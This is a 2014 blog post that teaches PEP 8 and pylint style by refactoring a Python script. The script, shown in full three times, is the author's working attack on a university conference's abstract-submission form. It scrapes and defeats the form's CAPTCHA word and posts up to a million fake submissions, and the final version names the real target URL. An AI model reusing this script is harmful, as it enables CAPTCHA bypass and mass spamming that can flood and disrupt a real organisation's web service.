Title: Improving Readability with PEP 8
Date: 2014-07-26 22:38
Tags: python
Summary: Make your code more readable

[PEP 8](http://legacy.python.org/dev/peps/pep-0008/) is the Python language's style guide. It is generally accepted by the Python community as the best guidelines for readability. To prove it we are going to take poorly written code and improve it to follow the [PEP 8](http://legacy.python.org/dev/peps/pep-0008/) guidelines. Before following this you should read through [PEP 8](http://legacy.python.org/dev/peps/pep-0008/) so you have an idea of the different guidelines. You should also install two tools called `pep8` and [`pylint`](http://www.pylint.org/). You can run them on each of your source files to check for excellent styling. Install `pep8` via pip `pip install pep8` and `pylint` through your package manager (unless you're on OS X or Windows...then use pip). 

Here is our starting source file. It is the code I used as a proof-of-concept for an attack on a [submission system](https://seanmckaybeck.com/2014/06/06/spamming-a-submission-system/) and it could use some cleaning. Please note as the actual source file differs slightly from what is shown below, so some of the error messages may refer to lines differently, and some lines may not have errors mentioned about them even though they are problematic.
```
import re
from bs4 import BeautifulSoup
import requests
from random import randrange

def get_the_secret(text):
    matches = re.findall(r'\"(.+?)\"', text)
    return ''.join(matches)

def grab_the_page(url):
    r = requests.get(url)
    while r.status_code != 200:
        r = requests.get(url)
    return r.content

def grab_the_word_key(content):
    soup = BeautifulSoup(content)
    word_key = soup.find_all('input', attrs={'name': 'word_key'})
    return str(int(word_key[0]['value']))

def parse_the_page(content):
    soup = BeautifulSoup(content)
    labels = soup.find_all('label')
    for label in labels:
        if 'To prove you are a human type' in label.contents[0]:
            return get_the_secret(label.contents[0])

if __name__ == '__main__':
    target = 'http://suchredacted.bike'
    c = grab_the_page()
    word_key = grab_the_word_key(c)
    word_value = parse_the_page(c)
    dictionary = open('Jargon', 'r')
    first_names = open('Given-Names', 'r')
    last_names = open('Family-Names', 'r')
    num_to_spam = 1000000
    degree_levels = [ 'Undergraduate', 'Masters', 'Doctorate' ]
    advisors_nums = [ '169', '171', 'g_127', 'g_129', 'g_132' ] # all valid cs teachers
    # sp4m that submission system!
    for i in range(num_to_spam):
        first_name = first_names.readline().strip()
        last_name = last_names.readline().strip()
        email = first_name+last_name+'@gmail.com'
        degree_level = degree_levels[randrange(0,len(degree_levels))]
        department = '2' # this is the code for computer science
        faculty_advisor = advisors_nums[randrange(0,len(advisors_nums))]
        abstract_title = dictionary.readline().strip()
        abstract = first_name+' '+last_name+' '+email+' '+degree_level+' '+department+' '+faculty_advisor+' '+abstract_title
        abstract += ' '+abstract
        data = {'first_name': first_name, 
            'last_name': last_name,
            'email': email,
            'degree_level': degree_level,
            'department': department,
            'faculty_advisor': faculty_advisor,
            'abstract_title': abstract_title,
            'abstract': abstract,
            'num': word_key,
            'key': word_value,
            'submit': 'Submit'
            }
        requests.post(target, data=data)
    print 'Finished spamming the submission system'
```

Let's run `pep8` on it and see what happens. 

```
byu_abstract_exploit/break_abstract_submission.py:6:1: E302 expected 2 blank lines, found 1
byu_abstract_exploit/break_abstract_submission.py:10:1: E302 expected 2 blank lines, found 1
byu_abstract_exploit/break_abstract_submission.py:16:1: E302 expected 2 blank lines, found 1
byu_abstract_exploit/break_abstract_submission.py:21:1: E302 expected 2 blank lines, found 1
byu_abstract_exploit/break_abstract_submission.py:29:80: E501 line too long (88 > 79 characters)
byu_abstract_exploit/break_abstract_submission.py:37:22: E201 whitespace after '['
byu_abstract_exploit/break_abstract_submission.py:37:62: E202 whitespace before ']'
byu_abstract_exploit/break_abstract_submission.py:38:22: E201 whitespace after '['
byu_abstract_exploit/break_abstract_submission.py:38:62: E202 whitespace before ']'
byu_abstract_exploit/break_abstract_submission.py:38:64: E261 at least two spaces before inline comment
byu_abstract_exploit/break_abstract_submission.py:38:80: E501 line too long (87 > 79 characters)
byu_abstract_exploit/break_abstract_submission.py:44:49: E231 missing whitespace after ','
byu_abstract_exploit/break_abstract_submission.py:45:25: E261 at least two spaces before inline comment
byu_abstract_exploit/break_abstract_submission.py:46:52: E231 missing whitespace after ','
byu_abstract_exploit/break_abstract_submission.py:48:80: E501 line too long (124 > 79 characters)
byu_abstract_exploit/break_abstract_submission.py:50:17: E201 whitespace after '{'
byu_abstract_exploit/break_abstract_submission.py:50:43: W291 trailing whitespace
byu_abstract_exploit/break_abstract_submission.py:51:17: E128 continuation line under-indented for visual indent
byu_abstract_exploit/break_abstract_submission.py:52:17: E128 continuation line under-indented for visual indent
byu_abstract_exploit/break_abstract_submission.py:53:17: E128 continuation line under-indented for visual indent
byu_abstract_exploit/break_abstract_submission.py:54:17: E128 continuation line under-indented for visual indent
byu_abstract_exploit/break_abstract_submission.py:55:17: E128 continuation line under-indented for visual indent
byu_abstract_exploit/break_abstract_submission.py:56:17: E128 continuation line under-indented for visual indent
byu_abstract_exploit/break_abstract_submission.py:57:17: E128 continuation line under-indented for visual indent
byu_abstract_exploit/break_abstract_submission.py:58:17: E128 continuation line under-indented for visual indent
byu_abstract_exploit/break_abstract_submission.py:59:17: E124 closing bracket does not match visual indentation
```
Well that is a lot of errors. This is not unexpected as you can just look at the original code and see that it is not very readable. Thankfully `pep8` is specific about what the errors are and how to fix them. Let's start right from the top and fix the first four errors. 

According to PEP 8 it is ideal for global functions to be separated by two blank lines. This makes it easier to distinguish between the end of one function and the beginning of the next. 

```
def grab_the_page(url):
    r = requests.get(url)
    while r.status_code != 200:
        r = requests.get(url)
    return r.content


def grab_the_word_key(content):
    soup = BeautifulSoup(content)
    word_key = soup.find_all('input', attrs={'name': 'word_key'})
    return str(int(word_key[0]['value']))
```
Notice the difference? This is much more preferrable to one blank line or none at all. 

The next large set of errors is complaining about the indentation level of the key-value pairs in the dictionary `data`. By PEP 8's rules it is much easier to read through a dictionary like `data` if all of the contents are aligned. 

```
data = {'first_name': first_name, 
        'last_name': last_name,
        'email': email,
        'degree_level': degree_level,
        'department': department,
        'faculty_advisor': faculty_advisor,
        'abstract_title': abstract_title,
        'abstract': abstract,
        'num': word_key,
        'key': word_value,
        'submit': 'Submit'
        }
```
The closing brace can either be aligned with the keys of the dictionary or be aligned with the declaration of `data`. 	

The next set complains about unnecessary whitespace in the lists `degree_levels` and `advisors_nums`. The extra whitespace does not help readability and can be done away with. While we're at it let's get rid of that comment on the end of the `advisors_nums` line as it is not helpful either. There is also some missing whitespace after the commas in the following two lines. One space after a comma helps distinguish between the end of one parameter and the beginning of the next.

```
degree_level = degree_levels[randrange(0,len(degree_levels))]
faculty_advisor = advisors_nums[randrange(0,len(advisors_nums))]
```
Now all we are left with are two long lines and some trailing whitespace. PEP 8 specifies that lines should be no longer than 79 characters. If a line is longer than that it becomes difficult to determine what the purpose of the entire line is. Python encourages readability and only performing one task per line of code. If a line is too long than it is more than likely violating that rule. In the case of our first long line it does not look long here because I redacted the full URL. There really isn't much I can do about that. However the other line is disgusting. 

```
abstract = first_name+' '+last_name+' '+email+' '+degree_level+' '+department+' '+faculty_advisor+' '+abstract_title
```
To improve the readability of this line we can extend it to run across multiple lines.

```
abstract = first_name + ' ' + last_name + ' ' + email + \
    ' ' + degree_level + ' ' + department + ' ' + \
    faculty_advisor + ' ' + abstract_title
```

That takes care of all of the errors reported by PEP 8 and we finish with the following. 

```
import re
from bs4 import BeautifulSoup
import requests
from random import randrange


def get_the_secret(text):
    matches = re.findall(r'\"(.+?)\"', text)
    return ''.join(matches)


def grab_the_page(url):
    r = requests.get(url)
    while r.status_code != 200:
        r = requests.get(url)
    return r.content


def grab_the_word_key(content):
    soup = BeautifulSoup(content)
    word_key = soup.find_all('input', attrs={'name': 'word_key'})
    return str(int(word_key[0]['value']))


def parse_the_page(content):
    soup = BeautifulSoup(content)
    labels = soup.find_all('label')
    for label in labels:
        if 'To prove you are a human type' in label.contents[0]:
            return get_the_secret(label.contents[0])


if __name__ == '__main__':
    target = 'http://somethingsomethingyoucantsee.me'
    c = grab_the_page(target)
    word_key = grab_the_word_key(c)
    word_value = parse_the_page(c)
    dictionary = open('Jargon', 'r')
    first_names = open('Given-Names', 'r')
    last_names = open('Family-Names', 'r')
    num_to_spam = 1000000
    degree_levels = ['Undergraduate', 'Masters', 'Doctorate']
    advisors_nums = ['169', '171', 'g_127', 'g_129', 'g_132']
    # sp4m that submission system!
    for i in range(num_to_spam):
        first_name = first_names.readline().strip()
        last_name = last_names.readline().strip()
        email = first_name+last_name+'@gmail.com'
        degree_level = degree_levels[randrange(0, len(degree_levels))]
        department = '2'  # this is the code for computer science
        faculty_advisor = advisors_nums[randrange(0, len(advisors_nums))]
        abstract_title = dictionary.readline().strip()
        abstract = first_name + ' ' + last_name + ' ' + email + \
            ' ' + degree_level + ' ' + department + ' ' + \
            faculty_advisor + ' ' + abstract_title
        abstract += ' '+abstract
        data = {'first_name': first_name,
                'last_name': last_name,
                'email': email,
                'degree_level': degree_level,
                'department': department,
                'faculty_advisor': faculty_advisor,
                'abstract_title': abstract_title,
                'abstract': abstract,
                'num': word_key,
                'key': word_value,
                'submit': 'Submit'
                }
        requests.post(target, data=data)
    print 'Finished spamming the submission system'

```

This code now conforms to the majority of the PEP 8 standard. However Pylint helps fix the rest of it. Instead of walking you through the process of fixing those errors I will let you do so on your own. `pylint` is run on your source file from the command line and it gives your code a rating. Even after fixing the prior violations via `pep8` this code is still only a 5.96 our of 10. To make running `pylint` on my code easier I use the `Syntastic` plugin for Vim. I never have to leave Vim and all the syntax imperfections are pointed out to me when I save my file. The perfected code is shown below. It is actually a 9.8/10 because the `main()` method has too many local variables. However with this script that is hard to avoid. 

```
'''
This script is a proof-of-concept attack against the abstract submission
system for the _______ conference.
'''
import re
from random import randrange

from bs4 import BeautifulSoup
import requests


def get_the_secret(text):
    '''
    Returns the secret page word

    text - the HTML containing the secret word

    This function extracts the secret word from the page
    to get around the awful CAPTCHA functionality built
    into it. Returns the secret word
    '''
    matches = re.findall(r'\"(.+?)\"', text)
    return ''.join(matches)


def grab_the_page(url):
    '''
    Returns the content of the target page
    '''
    resp = requests.get(url)
    while resp.status_code != 200:
        resp = requests.get(url)
    return resp.content


def grab_the_word_key(content):
    '''
    Returns the HTML containing the secret word

    content - The entire page HTML
    '''
    soup = BeautifulSoup(content)
    key = soup.find_all('input', attrs={'name': 'word_key'})
    return str(int(key[0]['value']))


def parse_the_page(content):
    '''
    Parses the HTML for the target area containing the key word
    '''
    soup = BeautifulSoup(content)
    labels = soup.find_all('label')
    for label in labels:
        if 'To prove you are a human type' in label.contents[0]:
            return get_the_secret(label.contents[0])


def main():
    '''
    The main function
    '''
    target = 'http://cpms.byu.edu/about/' \
        'spring-research-conference/abstract-submission/'
    content = grab_the_page(target)
    word_key = grab_the_word_key(content)
    word_value = parse_the_page(content)
    num_to_spam = 1000000
    degree_levels = ['Undergraduate', 'Masters', 'Doctorate']
    advisors_nums = ['169', '171', 'g_127', 'g_129', 'g_132']
    # sp4m that submission system!
    with open('Jargon') as dictionary, \
            open('Given-Names') as first_names, \
            open('Family-Names') as last_names:
        num = 0
        while num < num_to_spam:
            first_name = first_names.readline().strip()
            last_name = last_names.readline().strip()
            email = first_name+last_name+'@gmail.com'
            degree_level = degree_levels[randrange(0, len(degree_levels))]
            department = '2'  # this is the code for computer science
            faculty_advisor = advisors_nums[randrange(0, len(advisors_nums))]
            abstract_title = dictionary.readline().strip()
            abstract = first_name + ' ' + last_name + ' ' + email + \
                ' ' + degree_level + ' ' + department + ' ' + \
                faculty_advisor + ' ' + abstract_title
            abstract += ' '+abstract
            data = {'first_name': first_name,
                    'last_name': last_name,
                    'email': email,
                    'degree_level': degree_level,
                    'department': department,
                    'faculty_advisor': faculty_advisor,
                    'abstract_title': abstract_title,
                    'abstract': abstract,
                    'num': word_key,
                    'key': word_value,
                    'submit': 'Submit'
                    }
            requests.post(target, data=data)
            num += 1
    print 'Finished spamming the submission system'

if __name__ == '__main__':
    main()
```
Readable code is just as important as working code, especially when collaborating with others. If the author can't even understand what the code does after not looking at it for a while then how will anyone else understand it? How can that code be improved if the programmer does not even understand what it does in the first place? Improve your Python code (or any code) by using these tools and always striving to make your code more readable. Force youself if you have to by setting up pre-commit git hooks in all of your repos. You will be glad you did. 

Other good reading:

* [PEP 257](http://legacy.python.org/dev/peps/pep-0257/)  
* [PEP 20](http://legacy.python.org/dev/peps/pep-0020/)
